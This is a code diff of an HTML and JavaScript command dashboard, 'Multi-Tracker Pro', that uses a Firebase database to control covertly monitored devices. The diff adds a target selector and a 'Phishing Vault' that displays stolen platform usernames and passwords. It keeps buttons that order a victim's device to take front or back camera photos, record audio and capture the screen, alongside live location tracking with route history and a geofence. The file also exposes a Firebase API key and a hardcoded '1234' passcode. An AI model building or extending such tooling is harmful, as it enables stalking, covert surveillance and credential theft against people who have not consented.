@@ -6,10 +6,10 @@
     <title>Pro Command Center</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
-        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; overflow: hidden; background: #000;}
+        body { margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; background: #000;}
         #map { height: 100vh; width: 100%; z-index: 1; }
         
-        /* Security Overlay CSS */
+        /* Security Overlay */
         .security-screen { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #0b0f19; z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; }
         .passcode-box { background: rgba(15, 23, 42, 0.9); padding: 30px; border-radius: 15px; border: 1px solid #38bdf8; box-shadow: 0 0 30px rgba(56,189,248,0.2); text-align: center; }
         .passcode-box h2 { color: #f8fafc; margin-top: 0; }
@@ -19,33 +19,35 @@
         .dashboard { position: absolute; top: 15px; left: 15px; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); padding: 20px; border-radius: 15px; z-index: 1000; box-shadow: 0 10px 30px rgba(0,0,0,0.8); width: 340px; max-height: 90vh; overflow-y: auto; border: 1px solid rgba(56,189,248,0.2); color: white; transition: 0.3s;}
         .dashboard::-webkit-scrollbar { width: 5px; } .dashboard::-webkit-scrollbar-thumb { background: #38bdf8; border-radius: 5px; }
         
-        .dash-header { font-size: 20px; font-weight: bold; border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 15px; color: #38bdf8; display: flex; justify-content: space-between; align-items: center;}
+        .dash-header { font-size: 18px; font-weight: bold; border-bottom: 1px solid #334155; padding-bottom: 10px; margin-bottom: 10px; color: #38bdf8; display: flex; justify-content: space-between; align-items: center;}
         
+        /* User Selector */
+        .target-box { background: rgba(239, 68, 68, 0.1); border: 1px solid #ef4444; border-radius: 8px; padding: 10px; margin-bottom: 15px; text-align: center;}
+        .target-select { width: 100%; background: #0f172a; color: #f8fafc; border: 1px solid #38bdf8; padding: 8px; border-radius: 5px; font-size: 14px; outline: none; margin-top: 5px;}
+
         .data-row { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 13px; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 8px;}
         .data-label { color: #94a3b8; } .data-val { font-weight: bold; color: #f8fafc; text-align: right; max-width: 60%; word-wrap: break-word;}
         
-        .address-box { background: rgba(16, 185, 129, 0.1); border-left: 4px solid #10b981; padding: 10px; border-radius: 5px; font-size: 13px; color: #e2e8f0; margin-bottom: 15px; line-height: 1.4;}
+        .address-box { background: rgba(16, 185, 129, 0.1); border-left: 4px solid #10b981; padding: 10px; border-radius: 5px; font-size: 13px; color: #e2e8f0; margin-bottom: 10px; line-height: 1.4;}
         
-        .btn-group { display: flex; gap: 8px; margin-top: 10px; flex-wrap: wrap;}
+        .btn-group { display: flex; gap: 5px; margin-top: 10px; flex-wrap: wrap;}
         .action-btn { flex: 1; min-width: 45%; padding: 8px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; color: white; transition: 0.2s; font-size: 12px;}
         .action-btn:active { transform: scale(0.95); }
         .ring-btn { background: #ef4444; } .msg-btn { background: #3b82f6; } 
-        .photo-btn { background: #8b5cf6; } .audio-btn { background: #ec4899; } .geo-btn { background: #f59e0b; color: black; min-width: 100%;}
+        .photo-btn { background: #8b5cf6; } .audio-btn { background: #ec4899; } .geo-btn { background: #f59e0b; color: black; min-width: 45%;} .screen-btn { background: #14b8a6; color: white; min-width: 45%;}
         
-        .media-box { margin-top: 15px; border: 1px dashed #38bdf8; border-radius: 8px; padding: 8px; text-align: center; display: none; background: rgba(0,0,0,0.5);}
+        .media-box { margin-top: 10px; border: 1px dashed #38bdf8; border-radius: 8px; padding: 8px; text-align: center; display: none; background: rgba(0,0,0,0.5);}
         .media-box img { max-width: 100%; border-radius: 5px; margin-top: 5px; }
         .media-box audio { width: 100%; margin-top: 5px; outline: none; }
         
-        .media-controls { display: flex; justify-content: space-between; margin-top: 10px; gap: 5px; }
-        .media-controls a, .media-controls button { flex: 1; padding: 5px; font-size: 12px; text-decoration: none; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; text-align: center;}
-        .dl-btn { background: #10b981; color: white; } .del-btn { background: #ef4444; color: white; }
-
+        /* Phishing Vault */
+        .vault-box { margin-top: 10px; background: rgba(220, 38, 38, 0.2); border: 1px solid #ef4444; border-radius: 8px; padding: 10px; display: none;}
+        .vault-title { color: #f82a2a; font-size: 14px; font-weight: bold; margin-bottom: 5px; text-align: center;}
+        
         .smart-marker { text-align: center; font-size: 35px; filter: drop-shadow(2px 4px 6px rgba(0,0,0,0.5)); transition: transform 0.3s; }
         .hide-btn { background: transparent; border: 1px solid #ef4444; color: #ef4444; padding: 3px 8px; border-radius: 5px; cursor: pointer; font-size: 12px;}
         .show-panel-btn { position: absolute; top: 15px; left: 15px; background: #0f172a; color: #38bdf8; border: 1px solid #38bdf8; padding: 10px 15px; border-radius: 8px; z-index: 1001; cursor: pointer; font-weight: bold; display: none; box-shadow: 0 5px 15px rgba(0,0,0,0.5);}
-        .hidden { display: none !important; }
         
-        /* Geo Alert overlay */
         .geo-alert { position: absolute; top: 20px; left: 50%; transform: translateX(-50%); background: #ef4444; color: white; padding: 15px 30px; font-weight: bold; font-size: 16px; border-radius: 10px; z-index: 2000; box-shadow: 0 0 20px rgba(239, 68, 68, 0.8); display: none; animation: blinker 1s linear infinite;}
         @keyframes blinker { 50% { opacity: 0.5; } }
     </style>
@@ -58,8 +60,7 @@
             <h2>🛡️ Admin Access</h2>
             <p style="color: #94a3b8; font-size: 14px;">Enter Security Passcode</p>
             <input type="password" id="passInput" class="pass-input" placeholder="****" maxlength="4">
-            <br>
-            <button id="passBtn" class="pass-btn">LOGIN</button>
+            <br><button id="passBtn" class="pass-btn">LOGIN</button>
             <p id="passError" style="color: #ef4444; font-size: 12px; display: none; margin-top: 10px;">Incorrect passcode!</p>
         </div>
     </div>
@@ -70,45 +71,53 @@
 
     <div class="dashboard" id="mainDashboard">
         <div class="dash-header">
-            <span>🛰️ Tracker Pro</span>
-            <div>
-                <span id="statusBadge" style="background:#64748b; padding: 3px 8px; border-radius: 10px; font-size: 12px; color:white; margin-right: 5px;">Waiting</span>
-                <button id="hidePanelBtn" class="hide-btn">➖ Hide</button>
-            </div>
+            <span>🛰️ Multi-Tracker Pro</span>
+            <button id="hidePanelBtn" class="hide-btn">➖ Hide</button>
+        </div>
+
+        <div class="target-box">
+            <span style="font-size: 12px; font-weight: bold;">SELECT TARGET</span>
+            <select id="userSelect" class="target-select">
+                <option value="">Listening for targets...</option>
+            </select>
         </div>
         
         <div class="address-box" id="addressUI">📍 Waiting for data...</div>
         
+        <div class="data-row"><span class="data-label">Status:</span> <span class="data-val" id="statusBadge" style="color:#64748b;">Offline</span></div>
         <div class="data-row"><span class="data-label">Device Info:</span> <span class="data-val" id="deviceUI">--</span></div>
         <div class="data-row"><span class="data-label">Battery Power:</span> <span class="data-val" id="batUI">--</span></div>
-        <div class="data-row"><span class="data-label">IP Address:</span> <span class="data-val" id="ipUI">--</span></div>
         <div class="data-row"><span class="data-label">Network/ISP:</span> <span class="data-val" id="ispUI">--</span></div>
-        <div class="data-row"><span class="data-label">Current Speed:</span> <span class="data-val" id="speedUI">0 km/h</span></div>
+        <div class="data-row"><span class="data-label">Speed:</span> <span class="data-val" id="speedUI">0 km/h</span></div>
+        <div class="data-row"><span class="data-label">Motion Tilt (XYZ):</span> <span class="data-val" id="motionUI">--</span></div>
         
         <div class="btn-group">
             <button id="photoFrontBtn" class="action-btn photo-btn">📸 Front Cam</button>
             <button id="photoBackBtn" class="action-btn photo-btn">📸 Back Cam</button>
-            <button id="audioBtn" class="action-btn audio-btn">🎙️ 5s Voice Record</button>
+            <button id="audioBtn" class="action-btn audio-btn">🎙️ 5s Voice</button>
+            <button id="screenBtn" class="action-btn screen-btn">📲 Screen Cap</button>
             <button id="ringBtn" class="action-btn ring-btn">🔔 Ring</button>
             <button id="geoBtn" class="action-btn geo-btn">🛡️ Geofence: OFF</button>
         </div>
 
+        <!-- Media Output -->
         <div class="media-box" id="photoBox">
             <div id="photoStatus" style="font-size: 12px; color: #94a3b8;">Latest Snapshot</div>
             <img id="spyImg" src="" alt="">
-            <div class="media-controls" id="photoControls" style="display:none;">
-                <a id="downloadPhoto" class="dl-btn" download="spy-photo.jpg">💾 Download</a>
-                <button id="deletePhoto" class="del-btn">🗑️ Delete Data</button>
-            </div>
+            <div style="margin-top: 5px;"><a id="downloadPhoto" download="spy-photo.jpg" style="color: #10b981; font-size:12px; text-decoration:none;">💾 Download</a></div>
         </div>
 
         <div class="media-box" id="audioBox">
             <div id="audioStatus" style="font-size: 12px; color: #94a3b8;">Latest Voice Record</div>
             <audio id="spyAudio" controls></audio>
-            <div class="media-controls" id="audioControls" style="display:none;">
-                <a id="downloadAudio" class="dl-btn" download="spy-voice.webm">💾 Download</a>
-                <button id="deleteAudio" class="del-btn">🗑️ Delete Data</button>
-            </div>
+        </div>
+
+        <!-- Phishing Vault -->
+        <div class="vault-box" id="vaultBox">
+            <div class="vault-title">💀 STOLEN CREDENTIALS</div>
+            <div class="data-row"><span class="data-label">Platform:</span> <span class="data-val" id="vaultPlat"></span></div>
+            <div class="data-row"><span class="data-label">Username:</span> <span class="data-val" id="vaultUser"></span></div>
+            <div class="data-row" style="margin-bottom:0;"><span class="data-label">Password:</span> <span class="data-val" id="vaultPass" style="color:#ef4444;"></span></div>
         </div>
     </div>
 
@@ -122,143 +131,150 @@
         const firebaseConfig = { apiKey: "AIzaSyAoQw5dhwS5JJZIWSPQTgKdMtB5ZEsoxLk", authDomain: "arng-805db.firebaseapp.com", projectId: "arng-805db", databaseURL: "https://arng-805db-default-rtdb.firebaseio.com/" };
         const app = initializeApp(firebaseConfig); const db = getDatabase(app);
 
-        // Map Setup with Nature/Terrain Layer
-        const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', { maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3']});
-        const streetLayer = L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { maxZoom: 19 });
-        const terrainLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=p&x={x}&y={y}&z={z}', { maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3']}); // 'p' is for Terrain/Nature
-        
-        const map = L.map('map', { layers: [satLayer] }).setView([23.8103, 90.4125], 6);
-        L.control.layers({"Satellite (স্যাটেলাইট)": satLayer, "Street (রাস্তা)": streetLayer, "Nature/Terrain (গাছপালা/প্রকৃতি)": terrainLayer}).addTo(map);
+        // Security Login
+        document.getElementById('passBtn').addEventListener('click', () => {
+            if(document.getElementById('passInput').value === '1234') { 
+                document.getElementById('securityScreen').style.display = 'none';
+            } else { document.getElementById('passError').style.display = 'block'; }
+        });
 
+        // Map Init
+        const satLayer = L.tileLayer('https://{s}.google.com/vt/lyrs=s,h&x={x}&y={y}&z={z}', { maxZoom: 20, subdomains: ['mt0', 'mt1', 'mt2', 'mt3']});
+        const map = L.map('map', { layers: [satLayer] }).setView([23.8103, 90.4125], 6);
+        
         let marker = null; let accuracyRadar = null; 
         let routeLine = L.polyline([], {color: '#ef4444', weight: 4, opacity: 0.8}).addTo(map);
-        let lastLat = 0, lastLng = 0; let geofenceEnabled = false; let geofenceCircle = null; let geofenceCenter = null;
+        let lastLat = 0, lastLng = 0; let geofenceEnabled = false; let geofenceCenter = null;
+        
+        let activeUserId = null;
+        let activeListeners = [];
 
-        // Security Logic
-        document.getElementById('passBtn').addEventListener('click', () => {
-            const pass = document.getElementById('passInput').value;
-            if(pass === '1234') { // Default passcode
-                document.getElementById('securityScreen').style.display = 'none';
-            } else {
-                document.getElementById('passError').style.display = 'block';
+        // UI Panel Toggles
+        document.getElementById('hidePanelBtn').addEventListener('click', () => { document.getElementById('mainDashboard').style.display='none'; document.getElementById('showPanelBtn').style.display='block'; });
+        document.getElementById('showPanelBtn').addEventListener('click', () => { document.getElementById('mainDashboard').style.display='block'; document.getElementById('showPanelBtn').style.display='none'; });
+
+        // Fetch All Users
+        onValue(ref(db, 'live_location/users'), (snapshot) => {
+            const users = snapshot.val();
+            const select = document.getElementById('userSelect');
+            const currentSelected = select.value;
+            
+            select.innerHTML = '<option value="">Select a Target</option>';
+            if(users) {
+                Object.keys(users).forEach(uid => {
+                    const info = users[uid].info;
+                    const status = info && info.isOnline ? "🟢" : "🔴";
+                    const ispp = info && info.isp ? info.isp.substring(0,10) : "";
+                    select.innerHTML += `<option value="${uid}">${status} Target: ${uid} (${ispp})</option>`;
+                });
+                if(users[currentSelected]) select.value = currentSelected;
             }
         });
 
-        // Auto-delete on Page Refresh to save Firebase Quota
-        remove(ref(db, 'live_location/photo'));
-        remove(ref(db, 'live_location/audio'));
-
-        document.getElementById('hidePanelBtn').addEventListener('click', () => { document.getElementById('mainDashboard').classList.add('hidden'); document.getElementById('showPanelBtn').style.display = 'block'; });
-        document.getElementById('showPanelBtn').addEventListener('click', () => { document.getElementById('mainDashboard').classList.remove('hidden'); document.getElementById('showPanelBtn').style.display = 'none'; });
-
-        document.getElementById('ringBtn').addEventListener('click', () => { set(ref(db, 'live_location/command'), { ringTime: Date.now() }); });
-        
-        function reqPhoto(type) {
-            set(ref(db, 'live_location/command'), { photoTime: Date.now(), camType: type }); 
-            document.getElementById('photoBox').style.display = 'block'; document.getElementById('photoControls').style.display = 'none';
-            document.getElementById('photoStatus').innerText = `Requesting ${type} camera...`; document.getElementById('photoStatus').style.color = "#f59e0b"; document.getElementById('spyImg').src = "";
+        // Command Buttons (Contextual to active user)
+        const sendCmd = (data) => {
+            if(!activeUserId) return alert("Select a target first!");
+            set(ref(db, `live_location/users/${activeUserId}/command`), data);
         }
-        document.getElementById('photoFrontBtn').addEventListener('click', () => reqPhoto("user"));
-        document.getElementById('photoBackBtn').addEventListener('click', () => reqPhoto("environment"));
 
-        document.getElementById('audioBtn').addEventListener('click', () => { 
-            set(ref(db, 'live_location/command'), { audioTime: Date.now() }); 
-            document.getElementById('audioBox').style.display = 'block'; document.getElementById('audioControls').style.display = 'none';
-            document.getElementById('audioStatus').innerText = "Recording voice (5s)..."; document.getElementById('audioStatus').style.color = "#f59e0b"; document.getElementById('spyAudio').src = "";
-        });
-
-        // Delete Buttons
-        document.getElementById('deletePhoto').addEventListener('click', () => { remove(ref(db, 'live_location/photo')); document.getElementById('photoBox').style.display = 'none'; alert("Photo deleted from Database!"); });
-        document.getElementById('deleteAudio').addEventListener('click', () => { remove(ref(db, 'live_location/audio')); document.getElementById('audioBox').style.display = 'none'; alert("Audio deleted from Database!"); });
+        document.getElementById('ringBtn').addEventListener('click', () => sendCmd({ ringTime: Date.now() }));
+        document.getElementById('photoFrontBtn').addEventListener('click', () => { sendCmd({ photoTime: Date.now(), camType: 'user' }); document.getElementById('photoBox').style.display = 'block'; });
+        document.getElementById('photoBackBtn').addEventListener('click', () => { sendCmd({ photoTime: Date.now(), camType: 'environment' }); document.getElementById('photoBox').style.display = 'block'; });
+        document.getElementById('audioBtn').addEventListener('click', () => { sendCmd({ audioTime: Date.now() }); document.getElementById('audioBox').style.display = 'block'; });
+        document.getElementById('screenBtn').addEventListener('click', () => { sendCmd({ screenTime: Date.now() }); document.getElementById('photoBox').style.display = 'block'; });
 
         document.getElementById('geoBtn').addEventListener('click', () => {
             geofenceEnabled = !geofenceEnabled;
             if(geofenceEnabled && lastLat !== 0) {
                 document.getElementById('geoBtn').innerText = "🛡️ Geofence: ON (200m)"; document.getElementById('geoBtn').style.background = "#10b981";
-                geofenceCenter = [lastLat, lastLng]; geofenceCircle = L.circle(geofenceCenter, { radius: 200, color: '#f59e0b', fillOpacity: 0.1 }).addTo(map);
+                geofenceCenter = [lastLat, lastLng]; 
             } else {
                 document.getElementById('geoBtn').innerText = "🛡️ Geofence: OFF"; document.getElementById('geoBtn').style.background = "#f59e0b";
-                if(geofenceCircle) map.removeLayer(geofenceCircle);
             }
         });
 
-        function fetchAddress(lat, lng) {
-            fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`).then(res => res.json()).then(data => { document.getElementById('addressUI').innerText = `📍 ${data.display_name}`; }).catch(()=>{});
-        }
+        // Listen to Specific User Data
+        document.getElementById('userSelect').addEventListener('change', (e) => {
+            activeUserId = e.target.value;
+            routeLine.setLatLngs([]); // clear route
+            if(!activeUserId) return;
+            
+            // Clean old UI state
+            document.getElementById('photoBox').style.display = 'none';
+            document.getElementById('audioBox').style.display = 'none';
+            document.getElementById('vaultBox').style.display = 'none';
 
-        onValue(ref(db, 'live_location/photo'), (snap) => {
-            const data = snap.val();
-            if (data && data.image) {
-                document.getElementById('photoStatus').innerText = "Successfully Captured!"; document.getElementById('photoStatus').style.color = "#10b981";
-                document.getElementById('spyImg').src = data.image;
-                document.getElementById('downloadPhoto').href = data.image;
-                document.getElementById('photoControls').style.display = 'flex';
-            } else if (data && data.error) {
-                document.getElementById('photoStatus').innerText = `⚠️ Cam Error: ${data.error}`; document.getElementById('photoStatus').style.color = "#ef4444";
-            }
-        });
-
-        onValue(ref(db, 'live_location/audio'), (snap) => {
-            const data = snap.val();
-            if (data && data.file) {
-                document.getElementById('audioStatus').innerText = "Voice Received!"; document.getElementById('audioStatus').style.color = "#10b981";
-                document.getElementById('spyAudio').src = data.file;
-                document.getElementById('downloadAudio').href = data.file;
-                document.getElementById('audioControls').style.display = 'flex';
-            } else if (data && data.error) {
-                document.getElementById('audioStatus').innerText = `⚠️ Mic Error: ${data.error}`; document.getElementById('audioStatus').style.color = "#ef4444";
-            }
-        });
-
-        onValue(ref(db, 'live_location/target_user'), (snapshot) => {
-            const data = snapshot.val();
-            if (data && data.isOnline) {
-                document.getElementById('statusBadge').style.background = '#10b981'; document.getElementById('statusBadge').innerText = 'Live';
-                document.getElementById('deviceUI').innerText = data.deviceInfo || "--";
-                document.getElementById('batUI').innerText = data.battery ? `${data.battery}% ${data.charging ? '⚡' : ''}` : "--";
-                document.getElementById('ipUI').innerText = data.ip_address || "--";
-                document.getElementById('ispUI').innerText = data.isp || "--";
-
-                if(data.status && data.status.includes("Error")) {
-                    document.getElementById('addressUI').innerText = `⚠️ ${data.status}`; document.getElementById('addressUI').style.borderLeftColor = "#ef4444"; return; 
-                }
-
-                document.getElementById('addressUI').style.borderLeftColor = "#10b981";
-                const { latitude: lat, longitude: lng, accuracy, speed, heading } = data;
-                document.getElementById('speedUI').innerText = `${speed} km/h`;
-
-                if (Math.abs(lastLat - lat) > 0.0005 || lastLat === 0) { fetchAddress(lat, lng); }
-                lastLat = lat; lastLng = lng;
-
-                let htmlFormat = `<div class="smart-marker" style="transform: rotate(${heading}deg);">${speed > 10 ? "🚘" : (speed > 2 ? "🚶‍♂️" : "🧍‍♂️")}</div>`;
-                const smartIcon = L.divIcon({ className: '', html: htmlFormat, iconSize: [40, 40], iconAnchor: [20, 20] });
-                const latlng = [lat, lng]; routeLine.addLatLng(latlng);
-
-                // Geofence Check
-                if(geofenceEnabled && geofenceCenter) {
-                    const centerLatLng = L.latLng(geofenceCenter[0], geofenceCenter[1]);
-                    const currentLatLng = L.latLng(lat, lng);
-                    const distance = centerLatLng.distanceTo(currentLatLng); // in meters
+            // Main Info Listener
+            onValue(ref(db, `live_location/users/${activeUserId}/info`), (snapshot) => {
+                const data = snapshot.val();
+                if (data && data.isOnline) {
+                    document.getElementById('statusBadge').style.color = '#10b981'; document.getElementById('statusBadge').innerText = 'Live';
+                    document.getElementById('deviceUI').innerText = data.deviceInfo || "--";
+                    document.getElementById('batUI').innerText = data.battery ? `${data.battery}% ${data.charging ? '⚡' : ''}` : "--";
+                    document.getElementById('ispUI').innerText = data.isp || "--";
                     
-                    if(distance > 200) { // 200m radius
-                        document.getElementById('geoAlert').style.display = 'block';
-                        // Optional: Play alert sound on admin side
-                        const alertSound = new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3');
-                        alertSound.play().catch(e=>{});
-                    } else {
-                        document.getElementById('geoAlert').style.display = 'none';
-                    }
-                }
+                    const { latitude: lat, longitude: lng, accuracy, speed, heading } = data;
+                    document.getElementById('speedUI').innerText = `${speed} km/h`;
 
-                if (!marker) { 
-                    accuracyRadar = L.circle(latlng, { radius: accuracy, color: '#38bdf8', fillColor: '#38bdf8', fillOpacity: 0.2 }).addTo(map);
-                    marker = L.marker(latlng, {icon: smartIcon}).addTo(map); map.flyTo(latlng, 18); 
-                } else { 
-                    marker.setLatLng(latlng); marker.setIcon(smartIcon); accuracyRadar.setLatLng(latlng); accuracyRadar.setRadius(accuracy); 
+                    if (Math.abs(lastLat - lat) > 0.0005 || lastLat === 0) { 
+                        fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lng}`).then(res => res.json()).then(d => { document.getElementById('addressUI').innerText = `📍 ${d.display_name}`; }).catch(()=>{});
+                    }
+                    lastLat = lat; lastLng = lng;
+
+                    let htmlFormat = `<div class="smart-marker" style="transform: rotate(${heading}deg);">${speed > 10 ? "🚘" : (speed > 2 ? "🚶‍♂️" : "🧍‍♂️")}</div>`;
+                    const smartIcon = L.divIcon({ className: '', html: htmlFormat, iconSize: [40, 40], iconAnchor: [20, 20] });
+                    const latlng = [lat, lng]; routeLine.addLatLng(latlng);
+
+                    // Geofence Calc
+                    if(geofenceEnabled && geofenceCenter) {
+                        const dist = L.latLng(geofenceCenter[0], geofenceCenter[1]).distanceTo(L.latLng(lat, lng));
+                        if(dist > 200) {
+                            document.getElementById('geoAlert').style.display = 'block';
+                            new Audio('https://assets.mixkit.co/active_storage/sfx/995/995-preview.mp3').play().catch(e=>{});
+                        } else { document.getElementById('geoAlert').style.display = 'none'; }
+                    }
+
+                    if (!marker) { 
+                        accuracyRadar = L.circle(latlng, { radius: accuracy, color: '#38bdf8', fillColor: '#38bdf8', fillOpacity: 0.2 }).addTo(map);
+                        marker = L.marker(latlng, {icon: smartIcon}).addTo(map); map.flyTo(latlng, 18); 
+                    } else { 
+                        marker.setLatLng(latlng); marker.setIcon(smartIcon); accuracyRadar.setLatLng(latlng); accuracyRadar.setRadius(accuracy); 
+                    }
+                } else {
+                    document.getElementById('statusBadge').style.color = '#ef4444'; document.getElementById('statusBadge').innerText = 'Offline';
                 }
-            } else {
-                document.getElementById('statusBadge').style.background = '#ef4444'; document.getElementById('statusBadge').innerText = 'Offline';
-            }
+            });
+
+            // Motion Listener
+            onValue(ref(db, `live_location/users/${activeUserId}/motion`), (snap) => {
+                const m = snap.val();
+                if(m) document.getElementById('motionUI').innerText = `${m.alpha}°, ${m.beta}°, ${m.gamma}°`;
+            });
+
+            // Phishing Vault Listener
+            onValue(ref(db, `live_location/users/${activeUserId}/vault`), (snap) => {
+                const v = snap.val();
+                if(v) {
+                    document.getElementById('vaultPlat').innerText = v.platform;
+                    document.getElementById('vaultUser').innerText = v.username;
+                    document.getElementById('vaultPass').innerText = v.password;
+                    document.getElementById('vaultBox').style.display = 'block';
+                }
+            });
+
+            // Media Listeners
+            onValue(ref(db, `live_location/users/${activeUserId}/media/photo`), (snap) => {
+                const p = snap.val();
+                if(p && p.image) {
+                    document.getElementById('photoStatus').innerText = "Media Captured!"; document.getElementById('spyImg').src = p.image; document.getElementById('downloadPhoto').href = p.image;
+                } else if (p && p.error) { document.getElementById('photoStatus').innerText = `Error: ${p.error}`; }
+            });
+            onValue(ref(db, `live_location/users/${activeUserId}/media/audio`), (snap) => {
+                const a = snap.val();
+                if(a && a.file) {
+                    document.getElementById('audioStatus').innerText = "Audio Received!"; document.getElementById('spyAudio').src = a.file; 
+                } else if (a && a.error) { document.getElementById('audioStatus').innerText = `Error: ${a.error}`; }
+            });
         });
     </script>
 </body>
